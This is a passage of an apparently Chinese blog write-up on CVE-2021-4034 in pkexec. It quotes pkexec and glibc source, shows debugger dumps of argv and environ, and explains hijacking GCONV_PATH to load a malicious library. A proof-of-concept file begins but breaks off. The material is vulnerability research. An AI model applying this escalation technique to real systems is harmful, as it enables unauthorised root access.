class=\"line\"></span><br><span class=\"line\">  original_user_name = <span class=\"built_in\">g_strdup</span> (<span class=\"built_in\">g_get_user_name</span> ());</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (original_user_name == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;Error getting user name.\\n&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((original_cwd = <span class=\"built_in\">g_get_current_dir</span> ()) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;Error getting cwd: %s\\n&quot;</span>,</span><br><span class=\"line\">                  <span class=\"built_in\">g_strerror</span> (errno));</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* First process options and find the command-line to invoke. Avoid using fancy library routines</span></span><br><span class=\"line\"><span class=\"comment\">   * that depend on environtment variables since we haven&#x27;t cleared the environment just yet.</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  opt_show_help = FALSE;</span><br><span class=\"line\">  opt_show_version = FALSE;</span><br><span class=\"line\">  opt_disable_internal_agent = FALSE;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (n = <span class=\"number\">1</span>; n &lt; (guint) argc; n++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--help&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          opt_show_help = TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--version&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          opt_show_version = TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--user&quot;</span>) == <span class=\"number\">0</span> || <span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;-u&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          n++;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (n &gt;= (guint) argc)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">usage</span> (argc, argv);</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (opt_user != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;--user specified twice\\n&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          opt_user = <span class=\"built_in\">g_strdup</span> (argv[n]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span> (argv[n], <span class=\"string\">&quot;--disable-internal-agent&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          opt_disable_internal_agent = TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>90 行 n 是从 1 开始的<br>\n 120 行 break 是退出循环，说明是要执行的命令<br>\n后面部分</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">g_assert</span> (argv[argc] == <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">path = <span class=\"built_in\">g_strdup</span> (argv[n]);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (path == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">usage</span> (argc, argv);</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (path[<span class=\"number\">0</span>] != <span class=\"string\">&#x27;/&#x27;</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* g_find_program_in_path() is not suspectible to attacks via the environment */</span></span><br><span class=\"line\">    s = <span class=\"built_in\">g_find_program_in_path</span> (path);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (s == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;Cannot run program %s: %s\\n&quot;</span>, path, <span class=\"built_in\">strerror</span> (ENOENT));</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    <span class=\"built_in\">g_free</span> (path);</span><br><span class=\"line\">    path = s;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* argc&lt;2 and pkexec runs just shell, argv is guaranteed to be null-terminated.</span></span><br><span class=\"line\"><span class=\"comment\">     * /-less shell shouldn&#x27;t happen, but let&#x27;s be defensive and don&#x27;t write to null-termination</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argv[n] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      argv[n] = path;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>g_find_program_in_path (path)</code>  搜索命令的绝对路径</li>\n<li>绝对路径被回写回 <code>argv[n]</code></li>\n</ul>\n<p>对于命令行参数 <code>argv[]</code>  是在 <code>environ[]</code>  之后连着被压入的<br>\n命令行启动 <code>pkexec</code> ，第一个参数是自己 <code>&quot;pkexec&quot;</code> <br>\n 但是如果用 <code>execve</code>  启动，第一个就是 <code>NULL</code>  了，第二个就是环境变量 <code>environ[0]</code></p>\n<h3 id=\"dl坏事做尽\"><a class=\"markdownIt-Anchor\" href=\"#dl坏事做尽\">#</a> dl 坏事做尽</h3>\n<p>glibc2.27 ****/elf/dl-support.c : 307</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_dl_non_dynamic_init (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ········</span><br><span class=\"line\">  ········</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__libc_enable_secure)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">char</span> unsecure_envvars[] =</span><br><span class=\"line\">\tUNSECURE_ENVVARS</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> EXTRA_UNSECURE_ENVVARS</span></span><br><span class=\"line\">\tEXTRA_UNSECURE_ENVVARS</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t;</span><br><span class=\"line\">      <span class=\"type\">const</span> <span class=\"type\">char</span> *cp = unsecure_envvars;</span><br><span class=\"line\">      <span class=\"comment\">// 清除不安全的环境变量</span></span><br><span class=\"line\">      <span class=\"keyword\">while</span> (cp &lt; unsecure_envvars + <span class=\"built_in\">sizeof</span> (unsecure_envvars))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  __unsetenv (cp);</span><br><span class=\"line\">\t  cp = (<span class=\"type\">const</span> <span class=\"type\">char</span> *) __rawmemchr (cp, <span class=\"string\">&#x27;\\0&#x27;</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> !HAVE_TUNABLES</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (__access (<span class=\"string\">&quot;/etc/suid-debug&quot;</span>, F_OK) != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t__unsetenv (<span class=\"string\">&quot;MALLOC_CHECK_&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> DL_PLATFORM_INIT</span></span><br><span class=\"line\">  DL_PLATFORM_INIT;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> DL_OSVERSION_INIT</span></span><br><span class=\"line\">  DL_OSVERSION_INIT;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  <span class=\"comment\">/* Now determine the length of the platform string.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_dl_platform != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    _dl_platformlen = <span class=\"built_in\">strlen</span> (_dl_platform);</span><br><span class=\"line\">  <span class=\"comment\">/* Scan for a program header telling us the stack is nonexecutable.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_dl_phdr != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">uint_fast16_t</span> i = <span class=\"number\">0</span>; i &lt; _dl_phnum; ++i)</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (_dl_phdr[i].p_type == PT_GNU_STACK)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  _dl_stack_flags = _dl_phdr[i].p_flags;</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> DL_SYSINFO_IMPLEMENTATION</span></span><br><span class=\"line\">DL_SYSINFO_IMPLEMENTATION</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> ENABLE_STATIC_PIE</span></span><br><span class=\"line\"><span class=\"comment\">/* Since relocation to hidden _dl_main_map causes relocation overflow on</span></span><br><span class=\"line\"><span class=\"comment\">   aarch64, a function is used to get the address of _dl_main_map.  */</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">link_map</span> *</span><br><span class=\"line\">_dl_get_dl_main_map (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> &amp;_dl_main_map;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n<p>而 <code>UNSECURE_ENVVARS</code>  的变量是定义在 glibc-2.27/sysdeps/generic/unsecvars.h : 10</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> !HAVE_TUNABLES</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> GLIBC_TUNABLES_ENVVAR <span class=\"string\">&quot;GLIBC_TUNABLES\\0&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> GLIBC_TUNABLES_ENVVAR</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"comment\">/* Environment variable to be removed for SUID programs.  The names are</span></span><br><span class=\"line\"><span class=\"comment\">   all stuffed in a single string which means they have to be terminated</span></span><br><span class=\"line\"><span class=\"comment\">   with a &#x27;\\0&#x27; explicitly.  */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> UNSECURE_ENVVARS \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;GCONV_PATH\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;GETCONF_DIR\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  GLIBC_TUNABLES_ENVVAR\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;HOSTALIASES\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_AUDIT\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_DEBUG\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_DEBUG_OUTPUT\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_DYNAMIC_WEAK\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_HWCAP_MASK\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_LIBRARY_PATH\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_ORIGIN_PATH\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_PRELOAD\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_PROFILE\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_SHOW_AUXV\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_USE_LOAD_BIAS\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LOCALDOMAIN\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LOCPATH\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;MALLOC_TRACE\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;NIS_PATH\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;NLSPATH\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;RESOLV_HOST_CONF\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;RES_OPTIONS\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;TMPDIR\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;TZDIR\\0&quot;</span></span></span><br></pre></td></tr></table></figure>\n<p>当检测程序是特权文件的时候，会清空上面的环境变量<br>\n所以不能直接当环境变量传入<br>\n但这次我们有一次任意写机会<br>\n需要劫持环境变量引入我们的恶意库</p>\n<h3 id=\"劫持环境变量\"><a class=\"markdownIt-Anchor\" href=\"#劫持环境变量\">#</a> 劫持环境变量</h3>\n<p>利用的环境变量是 <code>GCONV_PATH</code> <br>\n<a href=\"https://trganda.github.io/posts/iconv/\">https://trganda.github.io/posts/iconv/</a></p>\n<blockquote>\n<p>In <a href=\"https://www.gnu.org/software/libc/manual/html_node/Generic-Conversion-Interface.html\">glib</a>, a module named iconv support convert a charset to another. And the conversion was implemented in such dynamic library (gconv module) which implement pre-request <a href=\"https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html#6.5.4.4%20iconv%20module%20interfaces\">interface</a>, the usage of these gconv module were defined in a configuration file with name gconv-modules.</p>\n</blockquote>\n<ul>\n<li><code>iconv</code>  转换字符集</li>\n<li><code>iconv</code>  是在一个动态库 <code>gconv module</code></li>\n<li>动态库 <code>gconv module</code>  定义在配置文件夹 <code>gconv-modules</code>  里</li>\n<li>会调用这个文件夹 <code>gconv-modules</code>  下的 <code>so</code>  文件中的 <code>gconv()</code>  和 <code>gconv_init()</code></li>\n</ul>\n<p>The default  <code>gconv module</code>  and  <code>gconv module configuration</code>  file was located in:</p>\n<ul>\n<li>/usr/lib/gconv: Usual default gconv module path.</li>\n<li>/usr/lib/gconv/gconv-modules: Usual system default gconv module configuration file.</li>\n<li>/usr/lib/gconv/gconv-modules.cache: Usual system gconv module configuration cache</li>\n</ul>\n<p>可以看看 iconv 的 help</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/Desktop/cve/CVE-2021-4034/poc$ iconv --help</span><br><span class=\"line\">Usage: iconv [OPTION...] [FILE...]</span><br><span class=\"line\">Convert encoding of given files from one encoding to another.</span><br><span class=\"line\"></span><br><span class=\"line\"> Input/Output format specification:</span><br><span class=\"line\">  -f, --from-code=NAME       encoding of original text</span><br><span class=\"line\">  -t, --to-code=NAME         encoding for output</span><br><span class=\"line\"></span><br><span class=\"line\"> Information:</span><br><span class=\"line\">  -l, --list                 list all known coded character sets</span><br><span class=\"line\"></span><br><span class=\"line\"> Output control:</span><br><span class=\"line\">  -c                         omit invalid characters from output</span><br><span class=\"line\">  -o, --output=FILE          output file</span><br><span class=\"line\">  -s, --silent               suppress warnings</span><br><span class=\"line\">      --verbose              print progress information</span><br><span class=\"line\"></span><br><span class=\"line\">  -?, --help                 Give this help list</span><br><span class=\"line\">      --usage                Give a short usage message</span><br><span class=\"line\">  -V, --version              Print program version</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>使用</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv -f UTF-8 -t UTF-16 &lt; input file &gt; output file</span><br></pre></td></tr></table></figure>\n<p><code>iconv</code>  会调用 <code>iconv_open()</code>  而 <code>iconv_open()</code>  依赖环境变量 <code>GCONV_PATH</code></p>\n<blockquote>\n<p>The iconv support extension the charset conversion ability by user defined gconv module. When use iconv or call iconv() function, it must first allocate a conversion descriptor using <a href=\"https://man7.org/linux/man-pages/man3/iconv_open.3.html\">iconv_open()</a>. The operation of this function will influence by the enviroment GCONV_PATH</p>\n</blockquote>\n<p><em><strong>此处应该有源码，之后补</strong></em><br>\n用 <code>GCONV_PATH</code>  指定自定义模块去替换系统模块<br>\n所以利用方法如下</p>\n<blockquote>\n<p>Suppose we can control the content of enviroment GCONV_PATH, provide a gconv module configuration file and gconv module with evil code. The evil code may be execute for some case.</p>\n</blockquote>\n<p><a href=\"https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html#6.5.4.1%20Format%20of%20gconv-modules%20files\">gconv 格式</a></p>\n<h3 id=\"关于argv和environ\"><a class=\"markdownIt-Anchor\" href=\"#关于argv和environ\">#</a> 关于 argv 和 environ</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">environ</span></span><br><span class=\"line\">00:0000│ rdx 0x7fffffffe018 —▸ 0x7fffffffe374 ◂— &#x27;SHELL=/bin/bash&#x27;</span><br><span class=\"line\">01:0008│     0x7fffffffe020 —▸ 0x7fffffffe384 ◂— &#x27;SESSION_MANAGER=local/squ-virtual-machine:@/tmp/.ICE-unix/1566,unix/squ-virtual-machine:/tmp/.ICE-unix/1566&#x27;</span><br><span class=\"line\">02:0010│     0x7fffffffe028 —▸ 0x7fffffffe3f0 ◂— &#x27;QT_ACCESSIBILITY=1&#x27;</span><br><span class=\"line\">03:0018│     0x7fffffffe030 —▸ 0x7fffffffe403 ◂— &#x27;COLORTERM=truecolor&#x27;</span><br><span class=\"line\">04:0020│     0x7fffffffe038 —▸ 0x7fffffffe417 ◂— &#x27;XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg&#x27;</span><br><span class=\"line\">05:0028│     0x7fffffffe040 —▸ 0x7fffffffe444 ◂— &#x27;XDG_MENU_PREFIX=gnome-&#x27;</span><br><span class=\"line\">06:0030│     0x7fffffffe048 —▸ 0x7fffffffe45b ◂— &#x27;GNOME_DESKTOP_SESSION_ID=this-is-deprecated&#x27;</span><br><span class=\"line\">07:0038│     0x7fffffffe050 —▸ 0x7fffffffe487 ◂— &#x27;LC_ADDRESS=zh_CN.UTF-8&#x27;</span><br><span class=\"line\">08:0040│     0x7fffffffe058 —▸ 0x7fffffffe49e ◂— &#x27;GNOME_SHELL_SESSION_MODE=ubuntu&#x27;</span><br><span class=\"line\">09:0048│     0x7fffffffe060 —▸ 0x7fffffffe4be ◂— &#x27;LC_NAME=zh_CN.UTF-8&#x27;</span><br><span class=\"line\">0a:0050│     0x7fffffffe068 —▸ 0x7fffffffe4d2 ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class=\"line\">0b:0058│     0x7fffffffe070 —▸ 0x7fffffffe4fb ◂— &#x27;XMODIFIERS=@im=ibus&#x27;</span><br><span class=\"line\">0c:0060│     0x7fffffffe078 —▸ 0x7fffffffe50f ◂— &#x27;DESKTOP_SESSION=ubuntu&#x27;</span><br><span class=\"line\">0d:0068│     0x7fffffffe080 —▸ 0x7fffffffe526 ◂— &#x27;LC_MONETARY=zh_CN.UTF-8&#x27;</span><br><span class=\"line\">0e:0070│     0x7fffffffe088 —▸ 0x7fffffffe53e ◂— &#x27;SSH_AGENT_PID=1528&#x27;</span><br><span class=\"line\">0f:0078│     0x7fffffffe090 —▸ 0x7fffffffe551 ◂— &#x27;GTK_MODULES=gail:atk-bridge&#x27;</span><br><span class=\"line\">10:0080│     0x7fffffffe098 —▸ 0x7fffffffe56d ◂— &#x27;PWD=/home/squ/Desktop&#x27;</span><br><span class=\"line\">11:0088│     0x7fffffffe0a0 —▸ 0x7fffffffe583 ◂— &#x27;XDG_SESSION_DESKTOP=ubuntu&#x27;</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">argv</span></span><br><span class=\"line\">00:0000│ rsi 0x7fffffffe008 —▸ 0x7fffffffe35c ◂— &#x27;/home/squ/Desktop/a.out&#x27;</span><br><span class=\"line\">01:0008│     0x7fffffffe010 ◂— 0x0</span><br></pre></td></tr></table></figure>\n<p><code>argv</code>  的第一个参数是自己的绝对路径，第二个参数是 <code>NULL</code></p>\n<h4 id=\"execvec\"><a class=\"markdownIt-Anchor\" href=\"#execvec\">#</a> execve.c</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* <span class=\"type\">const</span> argv[] = &#123;</span><br><span class=\"line\">        <span 